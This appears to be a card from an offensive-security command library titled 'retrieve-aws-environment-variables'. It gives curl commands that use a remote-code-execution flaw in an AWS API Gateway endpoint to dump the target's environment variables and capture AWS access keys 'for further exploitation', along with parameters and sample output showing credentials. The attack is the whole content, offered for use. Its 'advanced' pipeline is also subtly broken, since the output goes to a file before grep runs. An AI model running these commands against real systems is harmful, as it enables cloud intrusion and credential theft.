---
id: be01f18e-e656-4c5d-a1fc-ade7c177780a
name: retrieve-aws-environment-variables
type: command
executor: bash
data: 'curl "https://apigateway/prod/system?cmd=env"'
output: null
created_at: '2023-04-06T03:56:11.532465+00:00'
updated_at: '2023-04-10T20:20:14.769383+00:00'
platforms:
  - AWS
tags:
  - rce
  - aws
  - credential-access
verified: true
validated: true
---

# retrieve-aws-environment-variables

## Command

```bash
curl "https://apigateway/prod/system?cmd=env"
```

## Description

This command sends an HTTP GET request to an AWS API Gateway endpoint vulnerable to RCE, using the 'cmd' parameter to execute the 'env' command on the target system. It retrieves all environment variables, which may expose sensitive AWS credentials for further exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `https://apigateway/prod/system?cmd=env` | The full URL with the RCE payload in the query parameter; replace 'apigateway' with the actual API Gateway domain if customized. | Yes |
| `-s` (optional) | Silent mode to suppress progress meter (add as `curl -s ...` for cleaner output). | No |
| `-v` (optional) | Verbose mode for debugging request/response headers (add as `curl -v ...`). | No |

## Examples

### Basic Usage

```bash
curl "https://apigateway/prod/system?cmd=env"
```

### Advanced Usage

```bash
curl -s -o env_vars.txt "https://apigateway/prod/system?cmd=env" | grep -i aws
```

This saves the output to a file and filters for AWS-related variables.

## Expected Output

A list of environment variables from the target system, such as:

```
PATH=/usr/local/bin:/usr/bin
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS_DEFAULT_REGION=us-east-1
HOME=/root
...
```

Success is indicated by the presence of AWS credential variables without HTTP errors (e.g., 200 OK response).

## Related

- [[procedures/aws-rce-for-credential-access]]
